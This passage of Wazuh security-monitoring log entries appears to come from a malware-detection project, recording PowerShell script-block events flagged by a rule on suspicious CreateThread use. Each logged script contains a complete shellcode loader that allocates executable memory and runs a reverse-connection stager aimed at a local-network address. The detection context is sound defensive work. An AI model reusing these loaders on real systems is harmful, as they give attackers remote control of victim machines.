0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0f,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"7e650f84-53f0-46d6-8909-e9e8cfee9da8","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2416.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:20:01.740+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":117,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304401.2984250","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:20:22.2593951Z","eventRecordID":"145293","processID":"5444","threadID":"3896","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x10,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 7952fb89-fd58-47ed-8cfd-7acd50f71e92\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2434.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x10,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"7952fb89-fd58-47ed-8cfd-7acd50f71e92","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2434.ps1"}}},"location":"EventChannel"}
